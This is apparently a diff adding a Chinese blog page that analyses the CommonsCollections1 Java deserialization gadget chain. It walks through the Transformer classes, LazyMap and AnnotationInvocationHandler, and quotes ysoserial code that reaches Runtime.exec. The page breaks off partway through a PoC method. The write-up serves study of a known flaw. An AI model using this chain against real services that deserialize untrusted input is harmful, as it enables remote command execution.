@@ -1,0 +1,310 @@
+<!doctype html><html lang=zh>
+<head><meta http-equiv=content-type content="text/html" charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc=">
+<link rel=preconnect href=https://fonts.googleapis.com>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css>
+<script src=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/code-line></script><title>CommonsCollections1 利用链分析</title>
+</head>
+<body class="flex flex-col bg-gray-100">
+<div class="flex my-8 font-serif">
+<div class="flex-auto w-1/3">
+<div class="w-64 h-full mr-2 ml-auto">
+<div class=mb-8><div class="border rounded-lg shadow-md">
+<div class="h-32 flex rounded-t-lg text-white" style=background-image:url(/images/background-1.jpg)>
+<div class=m-auto>
+<div class="text-center font-serif text-3xl my-2"><a href=/>Noth</a></div>
+<div class="text-center font-serif">去码头整点薯条</div>
+</div>
+</div>
+<nav class="rounded-b-lg bg-white">
+<ul class="py-2 ml-8">
+<li class="my-2 content-center">
+<a href=/ class=hover:text-red-300><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/archive/ class=hover:text-red-300><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
+</li>
+<li class="my-2 content-center">
+<a href=/categories/ class=hover:text-red-300><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
+</li>
+<li class="my-2 content-center">
+<a href=/tags/ class=hover:text-red-300><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/link/ class=hover:text-red-300><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/message/ class=hover:text-red-300><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
+</li>
+</ul>
+</nav>
+</div></div>
+<div class="sticky top-2">
+<div class=toc>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#gadget-chain>Gadget Chain</a></li>
+<li><a href=#命令执行链的构成>命令执行链的构成</a></li>
+<li><a href=#lazymap-调用链>LazyMap 调用链</a></li>
+<li><a href=#poc-测试>PoC 测试</a></li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+</div>
+<div class="flex-auto w-2/3">
+<div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
+<h1 class="font-serif text-4xl text-center mt-8 mb-2">CommonsCollections1 利用链分析</h1>
+<div class="text-right text-gray-500 mr-20">
+<span>
+Sep. 21, 2021 |
+<i class="far fa-bookmark"></i>
+</span>
+</div>
+<div class="content px-6 mb-8">
+<h2 id=gadget-chain>Gadget Chain</h2>
+<pre tabindex=0><code>Gadget chain:
+      ObjectInputStream.readObject()
+         AnnotationInvocationHandler.readObject()
+            Map(Proxy).entrySet()
+               AnnotationInvocationHandler.invoke()
+                  LazyMap.get()
+                     ChainedTransformer.transform()
+                        ConstantTransformer.transform()
+                        InvokerTransformer.transform()
+                           Method.invoke()
+                              Class.getMethod()
+                        InvokerTransformer.transform()
+                           Method.invoke()
+                              Runtime.getRuntime()
+                        InvokerTransformer.transform()
+                           Method.invoke()
+                              Runtime.exec()
+
+   Requires:
+      commons-collections
+</code></pre><p>这条利用链其实可以分为两个部分，后半部分从ChainedTransformer之后目的是为了构造一个可序列化的命令执行，前半部分则是用来触发这个操作的调用链，所以这里分成两部分分析。</p>
+<h2 id=命令执行链的构成>命令执行链的构成</h2>
+<p>Java 中一个常见的用来执行系统命令的方法是使用Runtime类的exec方法，可以看出上面调用链的最后就是Runtime.exec()，事实上，这条链就是调用这个函数的过程，接下来分析。</p>
+<p>首先先了解这几个类，参考文档（<a href=https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html>https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html</a>），这几个类很明显都是继承自Transformer或者实现了Transformer接口，因此首先看看这个Transformer：</p>
+<blockquote>
+<p>public interface <strong>Transformer</strong></p>
+<p>Defines a functor interface implemented by classes that transform one object into another.</p>
+<p>A <code>Transformer</code> converts the input object to the output object. The input object should be left unchanged. Transformers are typically used for type conversions, or extracting data from an object.</p>
+<p>Standard implementations of common transformers are provided by <code>[TransformerUtils](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/TransformerUtils.html)</code>. These include method invokation, returning a constant, cloning and returning the string value.</p>
+</blockquote>
+<p>简单来说，这个接口要求实现类可以将一个输入对象转换为输出对象，通常用于类型转换或者提取数据。说了但是好像有什么都没说，看看具体的实现吧：</p>
+<blockquote>
+<p>public class <strong>ChainedTransformer</strong></p>
+<p>Transformer implementation that chains the specified transformers together.</p>
+<p>The input object is passed to the first transformer. The transformed result is passed to the second transformer and so on.</p>
+<p>public Object <strong>transform</strong>(Object object)</p>
+<p>Transforms the input to result via each decorated transformer</p>
+</blockquote>
+<p>也就是说它的作用是像管道一样连接器多个 Transformer，使传入的对象经过这些 Transformer 依次转换，返回最终的结果；</p>
+<blockquote>
+<p>public class <strong>ConstantTransformer</strong></p>
+<p>Transformer implementation that returns the same constant each time.</p>
+<p>No check is made that the object is immutable. In general, only immutable objects should use the constant factory. Mutable objects should use the prototype factory.</p>
+<p>public Object <strong>transform</strong>(Object input)</p>
+<p>Transforms the input by ignoring it and returning the stored constant instead.</p>
+</blockquote>
+<p>这个 Transformer 会忽略掉输入的对象，并且固定的返回存储好的常量，结合构造方法可知这个常量则是构造方法中的参数；</p>
+<blockquote>
+<p>public class <strong>InvokerTransformer</strong></p>
+<p>Transformer implementation that creates a new object instance by reflection.</p>
+<p>public Object <strong>transform</strong>(Object input)</p>
+<p>Transforms the input to result by invoking a method on the input.</p>
+</blockquote>
+<p>结合构造方法，这个 Transformer 会通过反射的方法创建一个方法的实例，而使用时会使用创建的方法来转换输入对象，转换的具体方法是使用输入对象调用这个方法；一定程度上这个 Transformer 相当于根据参数构造出的一个函数。</p>
+<blockquote>
+<p>注：Commons Collections 3.2.2 提到，当尝试序列化或反序列化时会抛出UnsupportedOperationException 异常，但是可以选择开启这个支持，那就是通过<code>-Dproperty=true</code> 来设置 org.apache.commons.collections.enableUnsafeSerialization 属性为 true。</p>
+</blockquote>
+<p>由于后面会用到，这里在多说一点，方便后面理解。这个类的构造方法接受三个参数：<code>InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code> 这三个参数可以构成一个方法，也就是其中的 methodName，并且给出了参数，也就是后面的 args，如果是在一个非面向对象的语言中，这个函数已经可以执行了；但是对于Java，还需要一个对象来调用这个方法，这个对象就是<strong>transform</strong> 接受的对象，所以说可以通过这个对象来实现让另一个对象执行某个方法。</p>
+<p>大致清楚了这几个类的作用，结合ysoserial中的代码来看看这部分链：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>// inert chain for setup
+</span><span style=color:#75715e></span><span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+   <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span> <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span> <span style=color:#f92672>});</span>
+<span style=color:#75715e>// real chain for after setup
+</span><span style=color:#75715e></span><span style=color:#66d9ef>final</span> Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
+      <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+      <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
+         String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span> <span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
+         <span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
+      <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
+         Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span> <span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
+         <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
+      <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
+         <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span> <span style=color:#f92672>},</span> execArgs<span style=color:#f92672>),</span>
+      <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span> <span style=color:#f92672>};</span>
+</code></pre></div><p>这里 transformerChain 只是初始化用，后面会使用反射的方法将其指向后面的 transformers。</p>
+<p>前面说 ChainedTransformer 的作用就是连接多个transformer，并且将前一个的返回作为后一个的参数，所以可以直接将transformer当作一个管道来分析。</p>
+<p>首先是ConstantTransformer(Runtime.class)，也就是说这个 Transformer 会固定的返回一个 Runtime.class，其将会作为下一个参数处理的对象；而下一个为 InvokerTransformer，因此可以理解为由 Runtime.class 调用 getMethod(getRuntime)，这就会返回一个 getRuntime 方法对象，其继续作为参数向后传递；又是一个 InvokerTransformer，这意味着会调用 getRuntime().invoke() 方法，所以这里会返回 Runtime 对象；之后这个就更明显了，等同于 Runtime.exec(execArgs)，换言之，实现了命令执行；最后则是固定的返回了一个对象，其实前面已经可以实现命令执行了，但是这里又加入了一个 ConstantTransformer，这个对象很显然和前面的没有任何关系，也就意味着其并不会影响到命令执行，所以并不清楚其到底有什么作用，猜测这可能用来进行一些掩饰，因为后面在使用 Transformer 时，最终的返回结果会被设置为 Map 对象的一个值，如果直接返回命令执行的结果可能会增加出错和暴露的风险。</p>
+<p>可以看出，上面的过程其实就是模拟反射调用的过程：</p>
+<ol>
+<li>通过 ConstantTransformer 返回 Runtime.class；</li>
+<li>利用 InvokerTransformer 执行 Runtime.class.getMethod(&ldquo;getRuntime&rdquo;)，这里会获取到 java.lang.Runtime#getRuntime这个方法，但是还没有执行；</li>
+<li>再利用 InvokerTransformer 执行 invoke()方法，前面获取到的是一个 Method 对象，所以这里实际是使用 Method.invoke() 的过程，也就是 getRuntime.invoke(null)；如果以正常执行代码的角度看，到现在等同于执行了 java.lang.Runtime.getRuntime()方法，也就是获取到了 Runtime 对象；</li>
+<li>仍然是利用 InvokerTransformer ，上一步传来了 Runtime 对象，所以这一步很明显就是 Runtime.exec(execArgs) 执行命令了。</li>
+<li>总结来说，其相当于 Runtime.class.getMethod(&ldquo;getRuntime&rdquo;).invoke(null).exec(execArgs) ，等价于 Runtime.class.getRunime().exec(execArgs)，也就是 java.lang.Runtime.getRuntime().exec(execArgs)。</li>
+</ol>
+<h2 id=lazymap-调用链>LazyMap 调用链</h2>
+<p>这部分链比较绕，这里反着来看。既然已经构造好了一个反序列化的执行链，那么只要能找到一个可以出发操作的对象就行了，也就是需要找到一个能在反序列化时可以调用 <strong>ChainedTransformer.transform</strong> 方法的对象；虽然没有发现直接在 readObject 中调用这个方法的对象，但是找到了 LazyMap.get() 方法可能会调用这个方法。</p>
+<p>LazyMap 这个类的对象在构造时可以接受一个 Transformer 作为 factory，当调用 get(Object) 方法时，如果对象中不存在这样一个键，就会调用 factory 来创建一个值，并把这个值映射到这个键上：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>Object key<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// create value for key if key is not currently in the map
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>map<span style=color:#f92672>.</span><span style=color:#a6e22e>containsKey</span><span style=color:#f92672>(</span>key<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        Object value <span style=color:#f92672>=</span> factory<span style=color:#f92672>.</span><span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
+        map<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>key<span style=color:#f92672>,</span> value<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>return</span> value<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>return</span> map<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>可以看到，LazyMap.get() 方法中由调用到这个方法，如果 LazyMap 的 readObject() 有调用到 get 方法，那就可能触发这个操作。可惜的是并没有在其中找到这个方法，那就只能退而求其次，看看能不能在其他地方找到 lazyMap.get() 方法，依旧苦寻无果之后会发现 AnnotationInvocationHandler 类有一个 Map 类型的字段 memberValues，这个字段会在 invoke() 方法中执行 Map.get() 方法，而通过一定的方法就可以在 readObject() 中触发 invoke()。所以可以尝试从这里寻找突破（不得不说能发现这个链是真的厉害，这里链的构造真的是不可思议）。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>Object proxy<span style=color:#f92672>,</span> Method method<span style=color:#f92672>,</span> Object<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        String member <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
+        Class<span style=color:#f92672>&lt;?&gt;[]</span> paramTypes <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getParameterTypes</span><span style=color:#f92672>();</span>
+
+        <span style=color:#75715e>// Handle Object and Annotation methods
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;equals&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> paramTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>==</span> 1 <span style=color:#f92672>&amp;&amp;</span>
+            paramTypes<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>return</span> equalsImpl<span style=color:#f92672>(</span>args<span style=color:#f92672>[</span>0<span style=color:#f92672>]);</span>
+        <span style=color:#66d9ef>assert</span> paramTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>==</span> 0<span style=color:#f92672>;</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;toString&#34;</span><span style=color:#f92672>))</span>
+            <span style=color:#66d9ef>return</span> toStringImpl<span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hashCode&#34;</span><span style=color:#f92672>))</span>
+            <span style=color:#66d9ef>return</span> hashCodeImpl<span style=color:#f92672>();</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;annotationType&#34;</span><span style=color:#f92672>))</span>
+            <span style=color:#66d9ef>return</span> type<span style=color:#f92672>;</span>
+
+        <span style=color:#75715e>// Handle annotation member accessors
+</span><span style=color:#75715e></span>        Object result <span style=color:#f92672>=</span> memberValues<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>member<span style=color:#f92672>);</span>
+
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IncompleteAnnotationException<span style=color:#f92672>(</span>type<span style=color:#f92672>,</span> member<span style=color:#f92672>);</span>
+
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#66d9ef>instanceof</span> ExceptionProxy<span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#f92672>((</span>ExceptionProxy<span style=color:#f92672>)</span> result<span style=color:#f92672>).</span><span style=color:#a6e22e>generateException</span><span style=color:#f92672>();</span>
+
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>isArray</span><span style=color:#f92672>()</span> <span style=color:#f92672>&amp;&amp;</span> Array<span style=color:#f92672>.</span><span style=color:#a6e22e>getLength</span><span style=color:#f92672>(</span>result<span style=color:#f92672>)</span> <span style=color:#f92672>!=</span> 0<span style=color:#f92672>)</span>
+            result <span style=color:#f92672>=</span> cloneArray<span style=color:#f92672>(</span>result<span style=color:#f92672>);</span>
+
+        <span style=color:#66d9ef>return</span> result<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>上面是 jdk7 中的代码，其中调用了 memberValues.get(member) 方法，接下来考虑如何在 readObject 中触发 invoke()。</p>
+<p>invoke() 这个方法在学习动态代理的时候有见到过，使用动态代理创建的对象会在调用方法时触发 invoke()。这时回来看一眼就会发现 AnnotationInvocationHandler 不就是动态代理时要用到的 InvocationHandler，所以说如果创建一个动态代理的对象，那么其在调用方法是就会触发这个 invoke() 了，那么接下来就去 readObject() 中寻找哪个对象可以使用动态代理来创建并且调用了方法：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ObjectInputStream</span> s<span style=color:#f92672>)</span>
+    <span style=color:#66d9ef>throws</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>IOException</span><span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
+    s<span style=color:#f92672>.</span><span style=color:#a6e22e>defaultReadObject</span><span style=color:#f92672>();</span>
+
+    <span style=color:#75715e>// Check to make sure that types have not evolved incompatibly
+</span><span style=color:#75715e></span>
+    AnnotationType annotationType <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+        annotationType <span style=color:#f92672>=</span> AnnotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span>type<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span><span style=color:#f92672>(</span>IllegalArgumentException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#75715e>// Class is no longer an annotation type; all bets are off
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+
+    Map<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;&gt;</span> memberTypes <span style=color:#f92672>=</span> annotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>memberTypes</span><span style=color:#f92672>();</span>
+
+    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>String<span style=color:#f92672>,</span> Object<span style=color:#f92672>&gt;</span> memberValue <span style=color:#f92672>:</span> memberValues<span style=color:#f92672>.</span><span style=color:#a6e22e>entrySet</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
+        String name <span style=color:#f92672>=</span> memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>getKey</span><span style=color:#f92672>();</span>
+        Class<span style=color:#f92672>&lt;?&gt;</span> memberType <span style=color:#f92672>=</span> memberTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>memberType <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>  <span style=color:#75715e>// i.e. member still exists
+</span><span style=color:#75715e></span>            Object value <span style=color:#f92672>=</span> memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>getValue</span><span style=color:#f92672>();</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!(</span>memberType<span style=color:#f92672>.</span><span style=color:#a6e22e>isInstance</span><span style=color:#f92672>(</span>value<span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
+                  value <span style=color:#66d9ef>instanceof</span> ExceptionProxy<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setValue</span><span style=color:#f92672>(</span>
+                    <span style=color:#66d9ef>new</span> AnnotationTypeMismatchExceptionProxy<span style=color:#f92672>(</span>
+                        value<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>+</span> value <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;]&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>setMember</span><span style=color:#f92672>(</span>
+                            annotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>members</span><span style=color:#f92672>().</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>)));</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>这里有一个 memberValues，只有他不是在函数内部定义的并且调用了一个方法，并且仔细看就会发现这个对象实际是外部传进来的参数，那就可以确定使用它了。</p>
+<p>也就是说，首先通过动态代理定义一个 Map，并且其 handler 参数为AnnotationInvocationHandler，这时如果调用 Map 的方法；就会触发 AnnotationInvocationHandler#invoke，那么其中的 memberValues.get(member) 也就可以被触发，所以说作为参数的 AnnotationInvocationHandler 其实例化时需要接受前面构造的 lazyMap 作为自己的参数。除此之外，由于要在AnnotationInvocationHandler.readObject() 中触发 Map.entrySet() 操作，所以这个Map 也要传到一个AnnotationInvocationHandler 中作为参数。</p>
+<p>这么说有点绕，总结一下就是：</p>
+<ol>
+<li>这里一共有四个对象，分别是两个handler和两个map，其嵌套关系为 handler1(proxyMap(handler2(lazyMap)))，这里省略了其他的的参数。</li>
+<li>handler1 的作用是作为最终序列化的对象，调用其 readObject() 操作，触发其中的 proxyMap.entrySet() 方法；所以其实例化时需要设置 (Proxy) proxyMap作为参数，也就是 handler1 = AnnotationInvocationHandler(type, (Proxy) proxyMap)。</li>
+<li>proxyMap 是一个代理对象，其作用是触发 invoke() 方法，所以其创建时需要设置 AnnotationInvocationHandler 作为参数，也就是 map = Proxy.NewInstance( classLoader, Class, handler2)。</li>
+<li>handler2 的作用是通过执行 invoke() 方法来触发 lazyMap.get()，为了触发 lazyMap.get() 方法，必须设置其 memberValues 为 lazyMap，所以构造对象时需要传入 lazyMap 作为参数，也就是 handler2 = AnnotationInvocatioHandler(type, lazyMap)。</li>
+</ol>
+<p>OK，这部分也捋清楚了，但是还剩下一些问题：为了能触发 lazyMap.get() 方法，虽然现在可以触发 lazyMap.get() 方法，但是想要执行命令还要触发其中的 factory.transform() 方法，这就要求 lazyMap.get() 的参数没有在键中。</p>
+<p>返回去看调用这个方法的代码，其参数是 member，而这个 member 则是 invoke 时参数 method 的名称，在这里也就是 entrySet，所以只要 lazyMap 不存在 entrySet 这个键，就会触发操作。</p>
+<p>到此，这条链已经完全连起来了，接着尝试根据这个思路编写一个POC：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String commands<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// Init the transformer to exec commands.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+            <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span>commands<span style=color:#f92672>}),</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;&gt;())</span>
+            <span style=color:#f92672>}</span>
+    <span style=color:#f92672>);</span>
+
